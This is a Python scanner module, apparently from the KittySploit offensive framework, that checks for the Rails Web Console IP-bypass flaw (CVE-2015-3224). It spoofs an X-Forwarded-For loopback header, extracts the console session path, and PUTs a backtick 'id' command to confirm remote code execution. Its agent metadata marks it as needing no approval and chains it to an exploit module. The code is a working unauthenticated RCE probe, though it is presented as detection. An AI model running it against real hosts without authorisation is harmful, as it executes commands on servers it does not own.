#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Ruby on Rails Web Console IP whitelist bypass RCE (CVE-2015-3224)."""

import re
from urllib.parse import quote

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Ruby on Rails Web Console - IP Bypass RCE Detection (CVE-2015-3224)',
        'description': (
            'Detects CVE-2015-3224 by requesting a random path with X-Forwarded-For: 0000::1, '
            'extracting the web-console mount/session, then PUTting a backtick command.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2015', 'rails', 'ruby', 'rce', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.2,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [
                    'exploits/multi/http/rails_web_console_cve_2015_3224_rce',
                ],
            },
        },
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2015-3224'],
        'cve': 'CVE-2015-3224',
    }

    def run(self):
        path = f'/{self.random_text(8)}'
        headers = {'X-Forwarded-For': '0000::1'}
        r = self.http_request(method='GET', path=path, headers=headers, allow_redirects=False)
        if not r:
            return False
        body = r.text or ''
        if 'data-remote-path=' not in body and 'data-mount-point=' not in body:
            return False
        m = re.search(r'data-(?:remote-path|mount-point)=["\']([^"\']+)["\']', body)
        if not m:
            return False
        mount = m.group(1)
        if not mount.startswith('/'):
            mount = '/' + mount
        sess = re.search(r'data-session-id=["\']([^"\']+)["\']', body)
        if sess:
            mount = f'{mount}/repl_sessions/{sess.group(1)}'
        put_headers = {
            'X-Forwarded-For': '0000::1',
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'application/vnd.web-console.v2',
        }
        r2 = self.http_request(
            method='PUT',
            path=mount,
            data='input=' + quote('`id`', safe=''),
            headers=put_headers,
            allow_redirects=False,
        )
        if r2 and r2.status_code == 200 and re.search(r'uid=\d+', r2.text or '', re.I):
            self.set_info(
                severity='critical',
                reason='Rails Web Console IP bypass RCE (CVE-2015-3224)',
                path=mount,
            )
            return True
        return False
